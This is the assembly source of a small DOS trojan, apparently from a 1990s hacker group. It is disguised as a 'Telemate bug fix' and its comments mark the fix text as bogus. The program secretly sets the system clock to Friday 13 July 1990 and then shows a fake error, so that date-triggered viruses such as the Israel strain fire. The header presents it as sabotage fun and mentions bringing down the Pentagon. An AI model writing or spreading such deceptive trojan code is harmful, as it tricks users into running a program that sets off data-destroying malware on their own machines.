;-------------------------------------------------------------------;
; Simple little program to change the date to July 13th, 1990       ;
; Which just happens to be a Friday...what a coincidence....        ;
; This should be great fun if you have a virus or a program that    ;
; goes *BOOM* on Friday the 13th, such as the Israel strain         ;
; Have fun, and remember, I'm not responsible if you get your lazy  ;
; ass busted while trying to bring down the damn Pentagon           ;
; Kryptic Night - SMC - RaCK - U<< - PhD                            ;
;-------------------------------------------------------------------;
CODE    SEGMENT
        Assume  CS:code,DS:code
        ORG     100h

start:  Jmp begin
text1   db      ' Telemate bug fix for version 3.0+$ '  ;Bogus filler text
text2   db      ' TM.EXE fixed!$ '                      ;Bogus filler text
text3   db       07h,'Error! Cannot alter TM.EXE$ '     ;Printed after change

Begin   proc    NEAR
        mov     ah,05h                  ;Function 5 - Set Real Time Clock
        mov     cx,1990h                ;What century
        mov     dx,0713h                ;Month/day
        int     1ah                     ;Execute


        mov     ah,09h                  ;Funtion 9 - Print string <end in $>
        lea     dx,text3                ;What text to print
        int     21h                     ;Execute function 09
        int     20h                     ;Quit .COM file
        begin   endp
CODE    ENDS                                    ;End segment
        END start                               ;End program
